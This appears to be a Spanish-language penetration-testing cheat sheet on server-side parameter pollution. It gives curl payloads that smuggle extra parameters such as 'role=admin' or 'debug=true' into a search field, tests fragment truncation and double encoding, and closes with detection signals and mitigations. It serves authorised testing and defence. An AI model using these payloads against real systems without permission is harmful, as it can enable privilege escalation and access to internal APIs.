# Server-side Parameter Pollution

> Técnica: manipular parámetros enviados al backend para alterar requests que el servidor construye hacia APIs internas.

## Cuándo probar

- El backend actúa como proxy hacia otra API.
- Hay endpoints de búsqueda, reset, lookup o validación.
- Un parámetro externo parece usarse en una request interna.
- Errores revelan URLs internas, parámetros o servicios backend.
- Hay diferencias al inyectar `&`, `#`, `?`, parámetros duplicados o encoding.

## Modelo mental

```text
Cliente → Backend público → API interna
```

Request externa:

```http
GET /userSearch?name=alice
```

Request interna posible:

```http
GET /internal/users/search?name=alice
```

Objetivo: comprobar si podemos alterar la request interna.

## Variables

```bash
export BASE_URL="https://example.com"
```

## Payloads rápidos

### Inyectar nuevo parámetro

```bash
curl -i "$BASE_URL/userSearch?name=alice%26role=admin"
```

### Truncar query con fragment

```bash
curl -i "$BASE_URL/userSearch?name=alice%23"
```

### Inyectar query interna

```bash
curl -i "$BASE_URL/userSearch?name=alice%3Fdebug=true"
```

### Parámetro duplicado

```bash
curl -i "$BASE_URL/userSearch?name=alice&name=bob"
```

### Array-like parameters

```bash
curl -i "$BASE_URL/userSearch?name[]=alice&name[]=bob"
```

### Encodings dobles

```bash
curl -i "$BASE_URL/userSearch?name=alice%2526role%253Dadmin"
```

## Caracteres útiles

```text
%26     &
%23     #
%3F     ?
%3D     =
%2F     /
%25     %
```

## Qué buscar

| Señal | Posible interpretación |
|---|---|
| Cambia el resultado | Parámetro afecta a backend interno |
| Aparece error interno | La API interna procesó la entrada |
| Se trunca respuesta | `#` o `?` alteran la query |
| Parámetro duplicado tiene efecto | Override o merge inseguro |
| Mensaje menciona parámetro desconocido | API interna expuesta indirectamente |
| Aparece `debug`, `admin`, `role` | Posible contaminación exitosa |

## Pruebas recomendadas

### Baseline

```bash
curl -i "$BASE_URL/userSearch?name=alice"
```

### Comparar con inyección

```bash
curl -i "$BASE_URL/userSearch?name=alice%26role=admin"
```

### Comparar tamaños y códigos

```bash
for payload in "alice" "alice%26role=admin" "alice%23" "alice%3Fdebug=true" "alice&name=bob"
do
  echo "== $payload =="
  curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE_URL/userSearch?name=$payload"
done
```

## Evidencia mínima

```text
Endpoint:
Parámetro afectado:
Request baseline:
Request modificada:
Diferencia de response:
Error interno si existe:
Impacto:
```

## Falsos positivos

- El cambio solo afecta al frontend.
- El backend normaliza correctamente, pero cambia el mensaje.
- La diferencia se debe a caché o datos variables.
- No hay forma de demostrar impacto real.
- El parámetro añadido no llega a API interna.

## Mitigación

- Construir requests internas con librerías seguras.
- Codificar parámetros correctamente.
- Usar allowlist de parámetros.
- Rechazar parámetros duplicados si no son necesarios.
- No concatenar strings para construir URLs internas.
- No exponer errores de APIs internas.